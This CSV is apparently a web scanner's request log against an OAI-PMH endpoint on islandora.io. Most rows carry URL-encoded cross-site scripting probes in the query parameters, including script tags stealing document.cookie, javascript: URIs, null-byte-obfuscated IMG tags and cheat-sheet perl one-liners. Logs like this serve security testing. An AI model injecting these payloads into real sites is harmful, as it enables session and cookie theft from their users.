uuid,timestamp,http_status_code,request_url,response_time,http_version
a31a957b-5a1f-4715-9e57-bcb91b2f060b,2025-01-01 17:14:13,200,http://islandora.io/oai/request?verb=GetRecord&identifier=foo%5C%E2%80%99%3B+alert%28document.cookie%29%3B%2F%2F%E2%80%99%3B&metadataPrefix=marc,66.78 ms,HTTP/1.1
f67ebd4b-00b7-4fe6-89d1-1e0c1d528762,2025-01-01 17:14:13,200,http://islandora.io/oai/request?verb=g%27%22%3E%3C%2FIFRAME%3EHover+the+cursor+to+the+LEFT+of+this+Message%3C%2Fh1%3E%26ParamHeight%3D250,68.37 ms,HTTP/1.1
8497464c-418d-4ce8-bdca-6374b5f3bca5,2025-01-01 17:14:13,200,http://islandora.io/oai/request?verb=ListMetadataFormats,50.81 ms,HTTP/1.1
409210fd-244c-47be-abf8-8964905daf1a,2025-01-01 17:14:14,200,http://islandora.io/oai/request?verb=ListSets,46.34 ms,HTTP/1.1
8f4940e4-df4d-4d4b-9844-ad939e015d85,2025-01-01 17:14:14,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&until=g%27%22%3E%3C%2FIFRAME%3EHover+the+cursor+to+the+LEFT+of+this+Message%3C%2Fh1%3E%26ParamHeight%3D250&set=g%27%22%3E%3C%2FIFRAME%3EHover+the+cursor+to+the+LEFT+of+this+Message%3C%2Fh1%3E%26ParamHeight%3D250,67.79 ms,HTTP/1.1
d672c67a-5884-4596-ad4f-c9bcbd9d93d2,2025-01-01 17:14:14,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&from=g%27%22%3E%3C%2FIFRAME%3EHover+the+cursor+to+the+LEFT+of+this+Message%3C%2Fh1%3E%26ParamHeight%3D250,66.26 ms,HTTP/1.1
f77b80ac-318f-4500-be83-977dabe8ef63,2025-01-01 17:14:15,200,http://islandora.io/oai/request?verb=GetRecord&identifier=g%27%22%3E%3C%2FIFRAME%3EHover+the+cursor+to+the+LEFT+of+this+Message%3C%2Fh1%3E%26ParamHeight%3D250&metadataPrefix=marc,64.92 ms,HTTP/1.1
4613b6a1-1335-4913-98d9-b851db671244,2025-01-01 17:14:15,200,http://islandora.io/oai/request?verb=http%3A%2F%2Fwww.%3Cscript%3Ealert%281%29%3C%2Fscript+.com,98.07 ms,HTTP/1.1
494d340f-4cc6-433f-823c-dd3bde199402,2025-01-01 17:14:16,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=http%3A%2F%2Fwww.%3Cscript%3Ealert%281%29%3C%2Fscript+.com,63.56 ms,HTTP/1.1
c29c6b50-3d08-49da-9c88-63e2a46ab499,2025-01-01 17:14:16,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=http%3A%2F%2Fwww.%3Cscript%3Ealert%281%29%3C%2Fscript+.com,53.95 ms,HTTP/1.1
3f63e58b-4822-45af-ad3a-171b17f71a17,2025-01-01 17:14:16,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=http%3A%2F%2Fwww.%3Cscript%3Ealert%281%29%3C%2Fscript+.com&until=http%3A%2F%2Fwww.%3Cscript%3Ealert%281%29%3C%2Fscript+.com,64.03 ms,HTTP/1.1
7d1fd38e-f795-46e9-86ae-09b446830e8d,2025-01-01 17:14:17,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=http%3A%2F%2Fwww.%3Cscript%3Ealert%281%29%3C%2Fscript+.com&set=http%3A%2F%2Fwww.%3Cscript%3Ealert%281%29%3C%2Fscript+.com,69.64 ms,HTTP/1.1
b215130e-3562-4d22-9cc0-5f8d9f3381a7,2025-01-01 17:14:17,200,http://islandora.io/oai/request?verb=GetRecord&identifier=http%3A%2F%2Fwww.%3Cscript%3Ealert%281%29%3C%2Fscript+.com&metadataPrefix=oai_dc,72.48 ms,HTTP/1.1
215cb174-ce68-4e97-85fc-568fe3bf35b4,2025-01-01 17:14:17,200,http://islandora.io/oai/request?verb=http%3A%2F%2Fwww.google%3Cscript+.com%3Ealert%28document.location%29%3C%2Fscript,31.11 ms,HTTP/1.1
e9699b24-562a-4024-a4ce-2ec63f7d3107,2025-01-01 17:14:18,200,http://islandora.io/oai/request?verb=ListMetadataFormats,48.98 ms,HTTP/1.1
e3242409-2eb3-49dc-9b42-4e0557543c65,2025-01-01 17:14:18,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=http%3A%2F%2Fwww.google%3Cscript+.com%3Ealert%28document.location%29%3C%2Fscript,56.89 ms,HTTP/1.1
cbeede99-62ac-4b1f-b15a-ee7c5913c147,2025-01-01 17:14:18,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=http%3A%2F%2Fwww.google%3Cscript+.com%3Ealert%28document.location%29%3C%2Fscript&set=http%3A%2F%2Fwww.google%3Cscript+.com%3Ealert%28document.location%29%3C%2Fscript,83.05 ms,HTTP/1.1
5398e45f-71c5-4a06-aaaa-532f7b219faf,2025-01-01 17:14:19,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&until=http%3A%2F%2Fwww.google%3Cscript+.com%3Ealert%28document.location%29%3C%2Fscript,47.26 ms,HTTP/1.1
7ba749e0-b7ac-4e15-a801-fef3284cf968,2025-01-01 17:14:19,200,http://islandora.io/oai/request?verb=GetRecord&identifier=http%3A%2F%2Fwww.google%3Cscript+.com%3Ealert%28document.location%29%3C%2Fscript&metadataPrefix=oai_dc,47.19 ms,HTTP/1.1
a38ae5fc-9677-4d76-9358-3b12b930535c,2025-01-01 17:14:19,200,http://islandora.io/oai/request?verb=http%3A%2F%2Fwww.simpatie.ro%2Findex.php%3Fpage%3Dfriends%26member%3D781339%26javafunctionname%3DPageclick%26javapgno%3D2+javapgno%3D2+%3F%3FXSS%3F%3F,66.91 ms,HTTP/1.1
f22c5743-04de-40d9-89f0-ef7951c96671,2025-01-01 17:14:20,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=http%3A%2F%2Fwww.simpatie.ro%2Findex.php%3Fpage%3Dfriends%26member%3D781339%26javafunctionname%3DPageclick%26javapgno%3D2+javapgno%3D2+%3F%3FXSS%3F%3F,46.98 ms,HTTP/1.1
22708844-1db7-4cc7-936a-1ecd6197ec81,2025-01-01 17:14:20,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=http%3A%2F%2Fwww.simpatie.ro%2Findex.php%3Fpage%3Dfriends%26member%3D781339%26javafunctionname%3DPageclick%26javapgno%3D2+javapgno%3D2+%3F%3FXSS%3F%3F,41.92 ms,HTTP/1.1
ef7df15b-b9b4-47fc-8438-9e294b8eb743,2025-01-01 17:14:20,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&set=http%3A%2F%2Fwww.simpatie.ro%2Findex.php%3Fpage%3Dfriends%26member%3D781339%26javafunctionname%3DPageclick%26javapgno%3D2+javapgno%3D2+%3F%3FXSS%3F%3F,41.63 ms,HTTP/1.1
a75c6e28-3e58-42d6-bfc3-182b427a097c,2025-01-01 17:14:21,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=http%3A%2F%2Fwww.simpatie.ro%2Findex.php%3Fpage%3Dfriends%26member%3D781339%26javafunctionname%3DPageclick%26javapgno%3D2+javapgno%3D2+%3F%3FXSS%3F%3F&set=http%3A%2F%2Fwww.simpatie.ro%2Findex.php%3Fpage%3Dfriends%26member%3D781339%26javafunctionname%3DPageclick%26javapgno%3D2+javapgno%3D2+%3F%3FXSS%3F%3F,53.59 ms,HTTP/1.1
9fd8a101-96a6-4f84-8c42-224726ec773d,2025-01-01 17:14:21,200,http://islandora.io/oai/request?verb=GetRecord&identifier=http%3A%2F%2Fwww.simpatie.ro%2Findex.php%3Fpage%3Dfriends%26member%3D781339%26javafunctionname%3DPageclick%26javapgno%3D2+javapgno%3D2+%3F%3FXSS%3F%3F&metadataPrefix=marc,56.13 ms,HTTP/1.1
ef105f70-dbb6-4aff-9c9b-3145e86c366a,2025-01-01 17:14:21,200,http://islandora.io/oai/request?verb=http%3A%2F%2Fwww.simpatie.ro%2Findex.php%3Fpage%3Dtop_movies%26cat%3D13%26p%3D2+p%3D2+%3F%3FXSS%3F%3F,50.74 ms,HTTP/1.1
ca5990d3-25e3-456c-b414-6e8dbf7fd14d,2025-01-01 17:14:22,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=http%3A%2F%2Fwww.simpatie.ro%2Findex.php%3Fpage%3Dtop_movies%26cat%3D13%26p%3D2+p%3D2+%3F%3FXSS%3F%3F,36.44 ms,HTTP/1.1
3fe348d0-833c-42d7-b145-5033313804ce,2025-01-01 17:14:22,200,http://islandora.io/oai/request?verb=ListSets,53.93 ms,HTTP/1.1
00a40c15-9ac9-4568-a005-e31bf9a0b45d,2025-01-01 17:14:22,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&until=http%3A%2F%2Fwww.simpatie.ro%2Findex.php%3Fpage%3Dtop_movies%26cat%3D13%26p%3D2+p%3D2+%3F%3FXSS%3F%3F,55.02 ms,HTTP/1.1
191b4ad6-f19f-4f9a-a312-0b6f0c130efc,2025-01-01 17:14:23,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc,115.66 ms,HTTP/1.1
d4e32ca5-b750-4944-8dd2-7461302a52bf,2025-01-01 17:14:23,200,http://islandora.io/oai/request?verb=GetRecord&identifier=http%3A%2F%2Fwww.simpatie.ro%2Findex.php%3Fpage%3Dtop_movies%26cat%3D13%26p%3D2+p%3D2+%3F%3FXSS%3F%3F&metadataPrefix=marc,51.85 ms,HTTP/1.1
a45ad490-49ab-4de3-a4ce-96c299775c8c,2025-01-01 17:14:23,200,http://islandora.io/oai/request?verb=javascript%3Aalert%25281%2529%3B,47.52 ms,HTTP/1.1
77ee236a-6c3c-4a6f-bbb9-ee511e1830a0,2025-01-01 17:14:24,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=javascript%3Aalert%25281%2529%3B,53.82 ms,HTTP/1.1
36ebbbb7-f5ee-4f04-8f4c-7b270d7e03ce,2025-01-01 17:14:24,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=javascript%3Aalert%25281%2529%3B,45.53 ms,HTTP/1.1
b1a9e528-511f-45ba-94de-65580fb2f7b3,2025-01-01 17:14:24,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=javascript%3Aalert%25281%2529%3B&until=javascript%3Aalert%25281%2529%3B,43.33 ms,HTTP/1.1
e3ee450b-ade2-4f2f-851f-c23f07b6f74d,2025-01-01 17:14:25,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&until=javascript%3Aalert%25281%2529%3B,51.49 ms,HTTP/1.1
4518ca11-cce8-4e87-9e55-c673af588319,2025-01-01 17:14:25,200,http://islandora.io/oai/request?verb=GetRecord&identifier=javascript%3Aalert%25281%2529%3B&metadataPrefix=oai_dc,53.07 ms,HTTP/1.1
d10fb2b4-265c-4d49-b530-56b5b29b255f,2025-01-01 17:14:25,200,http://islandora.io/oai/request?verb=javascript%3Aalert%28%22hellox+worldss%22%29,57.65 ms,HTTP/1.1
03bd48a4-0dea-4cd4-b0b6-ab171d11ff9c,2025-01-01 17:14:26,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=javascript%3Aalert%28%22hellox+worldss%22%29,50.70 ms,HTTP/1.1
97ab111d-7c9a-4596-b228-c84ed90b60c1,2025-01-01 17:14:26,200,http://islandora.io/oai/request?verb=ListSets,43.49 ms,HTTP/1.1
4bb5d211-3a32-41fc-a44c-33faf8567f49,2025-01-01 17:14:26,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=javascript%3Aalert%28%22hellox+worldss%22%29&until=javascript%3Aalert%28%22hellox+worldss%22%29,34.88 ms,HTTP/1.1
a5d42838-e2cc-4425-8845-20cbdd266eef,2025-01-01 17:14:27,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&from=javascript%3Aalert%28%22hellox+worldss%22%29&set=javascript%3Aalert%28%22hellox+worldss%22%29,60.33 ms,HTTP/1.1
8a2dd1f2-14be-4232-8323-654130c199ed,2025-01-01 17:14:27,200,http://islandora.io/oai/request?verb=GetRecord&identifier=javascript%3Aalert%28%22hellox+worldss%22%29&metadataPrefix=oai_dc,56.03 ms,HTTP/1.1
66162703-3209-43eb-a0d9-2486fc62ff3b,2025-01-01 17:14:27,200,http://islandora.io/oai/request?verb=perl+-e+%26%23039%3Bprint+%5C%22%3B%3C%3BIMG+SRC%3Djava%5C0script%3Aalert%28%5C%22%3BXSS%5C%22%3B%29%3E%3B%5C%22%3B%3B%26%23039%3B+%3E%3B+out,48.58 ms,HTTP/1.1
e7bf7da1-94d0-4c96-af95-67dc4bce452a,2025-01-01 17:14:28,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=perl+-e+%26%23039%3Bprint+%5C%22%3B%3C%3BIMG+SRC%3Djava%5C0script%3Aalert%28%5C%22%3BXSS%5C%22%3B%29%3E%3B%5C%22%3B%3B%26%23039%3B+%3E%3B+out,53.90 ms,HTTP/1.1
c9954250-b8eb-4d47-ab82-454fef4a78eb,2025-01-01 17:14:28,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=perl+-e+%26%23039%3Bprint+%5C%22%3B%3C%3BIMG+SRC%3Djava%5C0script%3Aalert%28%5C%22%3BXSS%5C%22%3B%29%3E%3B%5C%22%3B%3B%26%23039%3B+%3E%3B+out,46.46 ms,HTTP/1.1
5ae6e954-88e8-42f6-9a75-1f3068840201,2025-01-01 17:14:28,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&until=perl+-e+%26%23039%3Bprint+%5C%22%3B%3C%3BIMG+SRC%3Djava%5C0script%3Aalert%28%5C%22%3BXSS%5C%22%3B%29%3E%3B%5C%22%3B%3B%26%23039%3B+%3E%3B+out,51.17 ms,HTTP/1.1
3b764ee7-6953-4c47-8f4e-be94be0f9465,2025-01-01 17:14:29,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc,48.51 ms,HTTP/1.1
37941393-bf5a-4db6-9337-ac33e3aea646,2025-01-01 17:14:29,200,http://islandora.io/oai/request?verb=GetRecord&identifier=perl+-e+%26%23039%3Bprint+%5C%22%3B%3C%3BIMG+SRC%3Djava%5C0script%3Aalert%28%5C%22%3BXSS%5C%22%3B%29%3E%3B%5C%22%3B%3B%26%23039%3B+%3E%3B+out&metadataPrefix=marc,49.99 ms,HTTP/1.1
00a06332-bd74-44d8-9108-e62c533e4fbd,2025-01-01 17:14:29,200,http://islandora.io/oai/request?verb=perl+-e+%26%23039%3Bprint+%5C%22%3B%3C%3BSCR%5C0IPT%3E%3Balert%28%5C%22%3BXSS%5C%22%3B%29%3C%3B%2FSCR%5C0IPT%3E%3B%5C%22%3B%3B%26%23039%3B+%3E%3B+out,44.01 ms,HTTP/1.1
21446f0a-5c19-443e-add3-88e7e92869a6,2025-01-01 17:14:30,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=perl+-e+%26%23039%3Bprint+%5C%22%3B%3C%3BSCR%5C0IPT%3E%3Balert%28%5C%22%3BXSS%5C%22%3B%29%3C%3B%2FSCR%5C0IPT%3E%3B%5C%22%3B%3B%26%23039%3B+%3E%3B+out,47.17 ms,HTTP/1.1
514289c5-e7bb-4520-bee3-6e0d226d620d,2025-01-01 17:14:30,200,http://islandora.io/oai/request?verb=ListSets,43.09 ms,HTTP/1.1
3872fdce-845f-42f8-a976-00fcaaacff97,2025-01-01 17:14:30,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc,59.63 ms,HTTP/1.1
45d5fbbe-49ee-452a-bb17-ec10b677cc29,2025-01-01 17:14:31,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=perl+-e+%26%23039%3Bprint+%5C%22%3B%3C%3BSCR%5C0IPT%3E%3Balert%28%5C%22%3BXSS%5C%22%3B%29%3C%3B%2FSCR%5C0IPT%3E%3B%5C%22%3B%3B%26%23039%3B+%3E%3B+out&set=perl+-e+%26%23039%3Bprint+%5C%22%3B%3C%3BSCR%5C0IPT%3E%3Balert%28%5C%22%3BXSS%5C%22%3B%29%3C%3B%2FSCR%5C0IPT%3E%3B%5C%22%3B%3B%26%23039%3B+%3E%3B+out,50.72 ms,HTTP/1.1
d74d5b3c-49de-415d-b1e4-e73cf0256291,2025-01-01 17:14:31,200,http://islandora.io/oai/request?verb=GetRecord&identifier=perl+-e+%26%23039%3Bprint+%5C%22%3B%3C%3BSCR%5C0IPT%3E%3Balert%28%5C%22%3BXSS%5C%22%3B%29%3C%3B%2FSCR%5C0IPT%3E%3B%5C%22%3B%3B%26%23039%3B+%3E%3B+out&metadataPrefix=marc,54.68 ms,HTTP/1.1
d40fbc21-ebd8-4f9a-adca-9bf5d8c66856,2025-01-01 17:14:31,200,http://islandora.io/oai/request?verb=perl+-e+%26%23039%3Bprint+%5C%26quot%3B%26lt%3BIMG+SRC%3Djava%5C0script%3Aalert%28%5C%26quot%3BXSS%5C%26quot%3B%29%26gt%3B%5C%26quot%3B%3B%26%23039%3B+%26gt%3B+out,56.95 ms,HTTP/1.1
4d394093-e15f-4e6f-afd7-7a2be957efe5,2025-01-01 17:14:32,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=perl+-e+%26%23039%3Bprint+%5C%26quot%3B%26lt%3BIMG+SRC%3Djava%5C0script%3Aalert%28%5C%26quot%3BXSS%5C%26quot%3B%29%26gt%3B%5C%26quot%3B%3B%26%23039%3B+%26gt%3B+out,76.06 ms,HTTP/1.1
7cff6d03-7b30-4fdb-807b-93fda76406a4,2025-01-01 17:14:32,200,http://islandora.io/oai/request?verb=ListSets,39.86 ms,HTTP/1.1
443ff6dd-60bc-4a33-bb8a-af7281eb81ca,2025-01-01 17:14:32,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&until=perl+-e+%26%23039%3Bprint+%5C%26quot%3B%26lt%3BIMG+SRC%3Djava%5C0script%3Aalert%28%5C%26quot%3BXSS%5C%26quot%3B%29%26gt%3B%5C%26quot%3B%3B%26%23039%3B+%26gt%3B+out&set=perl+-e+%26%23039%3Bprint+%5C%26quot%3B%26lt%3BIMG+SRC%3Djava%5C0script%3Aalert%28%5C%26quot%3BXSS%5C%26quot%3B%29%26gt%3B%5C%26quot%3B%3B%26%23039%3B+%26gt%3B+out,50.91 ms,HTTP/1.1
a7add0af-2165-42f9-9435-49b09847b605,2025-01-01 17:14:33,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc,115.32 ms,HTTP/1.1
ebc175ed-e985-4287-bfb4-5e3c7353c000,2025-01-01 17:14:33,200,http://islandora.io/oai/request?verb=GetRecord&identifier=perl+-e+%26%23039%3Bprint+%5C%26quot%3B%26lt%3BIMG+SRC%3Djava%5C0script%3Aalert%28%5C%26quot%3BXSS%5C%26quot%3B%29%26gt%3B%5C%26quot%3B%3B%26%23039%3B+%26gt%3B+out&metadataPrefix=marc,67.78 ms,HTTP/1.1
1be5685b-1d41-4b70-afbe-7ff8cb22ca4f,2025-01-01 17:14:33,200,http://islandora.io/oai/request?verb=perl+-e+%26%23039%3Bprint+%5C%26quot%3B%26lt%3BSCR%5C0IPT%26gt%3Balert%28%5C%26quot%3BXSS%5C%26quot%3B%29%26lt%3B%2FSCR%5C0IPT%26gt%3B%5C%26quot%3B%3B%26%23039%3B+%26gt%3B+out,60.45 ms,HTTP/1.1
ff6ba9bc-a017-4537-8ca1-a0dee1de6ea4,2025-01-01 17:14:34,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=perl+-e+%26%23039%3Bprint+%5C%26quot%3B%26lt%3BSCR%5C0IPT%26gt%3Balert%28%5C%26quot%3BXSS%5C%26quot%3B%29%26lt%3B%2FSCR%5C0IPT%26gt%3B%5C%26quot%3B%3B%26%23039%3B+%26gt%3B+out,64.10 ms,HTTP/1.1
c3a28f00-22c6-4fb0-988b-53fe2fdd21ea,2025-01-01 17:14:34,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=perl+-e+%26%23039%3Bprint+%5C%26quot%3B%26lt%3BSCR%5C0IPT%26gt%3Balert%28%5C%26quot%3BXSS%5C%26quot%3B%29%26lt%3B%2FSCR%5C0IPT%26gt%3B%5C%26quot%3B%3B%26%23039%3B+%26gt%3B+out,70.20 ms,HTTP/1.1
5e60f9b4-f8ed-4171-bfd8-9d58a9d4104c,2025-01-01 17:14:34,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc,41.50 ms,HTTP/1.1
e12c9bf1-5efb-4f20-962e-c39df672c799,2025-01-01 17:14:35,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=perl+-e+%26%23039%3Bprint+%5C%26quot%3B%26lt%3BSCR%5C0IPT%26gt%3Balert%28%5C%26quot%3BXSS%5C%26quot%3B%29%26lt%3B%2FSCR%5C0IPT%26gt%3B%5C%26quot%3B%3B%26%23039%3B+%26gt%3B+out&until=perl+-e+%26%23039%3Bprint+%5C%26quot%3B%26lt%3BSCR%5C0IPT%26gt%3Balert%28%5C%26quot%3BXSS%5C%26quot%3B%29%26lt%3B%2FSCR%5C0IPT%26gt%3B%5C%26quot%3B%3B%26%23039%3B+%26gt%3B+out&set=perl+-e+%26%23039%3Bprint+%5C%26quot%3B%26lt%3BSCR%5C0IPT%26gt%3Balert%28%5C%26quot%3BXSS%5C%26quot%3B%29%26lt%3B%2FSCR%5C0IPT%26gt%3B%5C%26quot%3B%3B%26%23039%3B+%26gt%3B+out,57.97 ms,HTTP/1.1
3dd3fa99-b413-4340-bff2-cb01ff081555,2025-01-01 17:14:35,200,http://islandora.io/oai/request?verb=GetRecord&identifier=perl+-e+%26%23039%3Bprint+%5C%26quot%3B%26lt%3BSCR%5C0IPT%26gt%3Balert%28%5C%26quot%3BXSS%5C%26quot%3B%29%26lt%3B%2FSCR%5C0IPT%26gt%3B%5C%26quot%3B%3B%26%23039%3B+%26gt%3B+out&metadataPrefix=marc,54.93 ms,HTTP/1.1
b7bca5f1-e5a2-44d8-aa35-1b8845728d34,2025-01-01 17:14:35,200,http://islandora.io/oai/request?verb=perl+-e+%26apos%3Bprint+%26quot%3B%26amp%3B%26lt%3BSCR%5C0IPT%26gt%3Balert%28%26quot%3BXSS%26quot%3B%29%26lt%3B%2FSCR%5C0IPT%26gt%3B%26quot%3B%3B%26apos%3B+%26gt%3B+out,64.79 ms,HTTP/1.1
87818b64-5950-4671-a13b-3033c130e0a2,2025-01-01 17:14:36,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=perl+-e+%26apos%3Bprint+%26quot%3B%26amp%3B%26lt%3BSCR%5C0IPT%26gt%3Balert%28%26quot%3BXSS%26quot%3B%29%26lt%3B%2FSCR%5C0IPT%26gt%3B%26quot%3B%3B%26apos%3B+%26gt%3B+out,68.68 ms,HTTP/1.1
bb5b7555-5c4f-4324-a26c-ee7d6c5caf9f,2025-01-01 17:14:36,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=perl+-e+%26apos%3Bprint+%26quot%3B%26amp%3B%26lt%3BSCR%5C0IPT%26gt%3Balert%28%26quot%3BXSS%26quot%3B%29%26lt%3B%2FSCR%5C0IPT%26gt%3B%26quot%3B%3B%26apos%3B+%26gt%3B+out,90.57 ms,HTTP/1.1
1b43e338-3ea6-4eb4-928e-b02aff90b4a5,2025-01-01 17:14:36,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=perl+-e+%26apos%3Bprint+%26quot%3B%26amp%3B%26lt%3BSCR%5C0IPT%26gt%3Balert%28%26quot%3BXSS%26quot%3B%29%26lt%3B%2FSCR%5C0IPT%26gt%3B%26quot%3B%3B%26apos%3B+%26gt%3B+out&until=perl+-e+%26apos%3Bprint+%26quot%3B%26amp%3B%26lt%3BSCR%5C0IPT%26gt%3Balert%28%26quot%3BXSS%26quot%3B%29%26lt%3B%2FSCR%5C0IPT%26gt%3B%26quot%3B%3B%26apos%3B+%26gt%3B+out,49.61 ms,HTTP/1.1
a28951e5-c386-4a48-ba01-e73074f2078a,2025-01-01 17:14:37,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&until=perl+-e+%26apos%3Bprint+%26quot%3B%26amp%3B%26lt%3BSCR%5C0IPT%26gt%3Balert%28%26quot%3BXSS%26quot%3B%29%26lt%3B%2FSCR%5C0IPT%26gt%3B%26quot%3B%3B%26apos%3B+%26gt%3B+out,61.73 ms,HTTP/1.1
51fcf027-eb88-450f-8665-dfa4cb7d622e,2025-01-01 17:14:37,200,http://islandora.io/oai/request?verb=GetRecord&identifier=perl+-e+%26apos%3Bprint+%26quot%3B%26amp%3B%26lt%3BSCR%5C0IPT%26gt%3Balert%28%26quot%3BXSS%26quot%3B%29%26lt%3B%2FSCR%5C0IPT%26gt%3B%26quot%3B%3B%26apos%3B+%26gt%3B+out&metadataPrefix=oai_dc,84.49 ms,HTTP/1.1
2e20e735-bbe8-4eff-b69a-7af3e2635a83,2025-01-01 17:14:38,200,http://islandora.io/oai/request?verb=perl+-e+%26apos%3Bprint+%26quot%3B%26lt%3BIMG+SRC%3Djava%5C0script%3Aalert%28%26quot%3BXSS%26quot%3B%29%3E%26quot%3B%3B%26apos%3B%26gt%3B+out,58.19 ms,HTTP/1.1
17940429-860f-4c47-b270-dd5266fc3920,2025-01-01 17:14:38,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=perl+-e+%26apos%3Bprint+%26quot%3B%26lt%3BIMG+SRC%3Djava%5C0script%3Aalert%28%26quot%3BXSS%26quot%3B%29%3E%26quot%3B%3B%26apos%3B%26gt%3B+out,58.24 ms,HTTP/1.1
c38726db-2b2b-41d0-b9ed-de1571879271,2025-01-01 17:14:38,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=perl+-e+%26apos%3Bprint+%26quot%3B%26lt%3BIMG+SRC%3Djava%5C0script%3Aalert%28%26quot%3BXSS%26quot%3B%29%3E%26quot%3B%3B%26apos%3B%26gt%3B+out,60.30 ms,HTTP/1.1
25084582-8c81-47f7-8dd2-319c801a19d1,2025-01-01 17:14:39,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=perl+-e+%26apos%3Bprint+%26quot%3B%26lt%3BIMG+SRC%3Djava%5C0script%3Aalert%28%26quot%3BXSS%26quot%3B%29%3E%26quot%3B%3B%26apos%3B%26gt%3B+out,77.61 ms,HTTP/1.1
a74ad5e6-9c84-4015-aab9-d5c3c114307a,2025-01-01 17:14:39,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&set=perl+-e+%26apos%3Bprint+%26quot%3B%26lt%3BIMG+SRC%3Djava%5C0script%3Aalert%28%26quot%3BXSS%26quot%3B%29%3E%26quot%3B%3B%26apos%3B%26gt%3B+out,45.82 ms,HTTP/1.1
fd581425-97c6-4ffb-9f9b-f776148f350f,2025-01-01 17:14:39,200,http://islandora.io/oai/request?verb=GetRecord&identifier=perl+-e+%26apos%3Bprint+%26quot%3B%26lt%3BIMG+SRC%3Djava%5C0script%3Aalert%28%26quot%3BXSS%26quot%3B%29%3E%26quot%3B%3B%26apos%3B%26gt%3B+out&metadataPrefix=marc,47.44 ms,HTTP/1.1
94f801c5-fde0-47bc-950f-1b66103798d7,2025-01-01 17:14:40,200,http://islandora.io/oai/request?verb=perl+-e+%27%3Bprint+%22%3B%26%3B%3C%3BSCR%5C0IPT%3E%3Balert%28%22%3BXSS%22%3B%29%3C%3B%2FSCR%5C0IPT%3E%3B%22%3B%3B%27%3B+%3E%3B+out,63.42 ms,HTTP/1.1
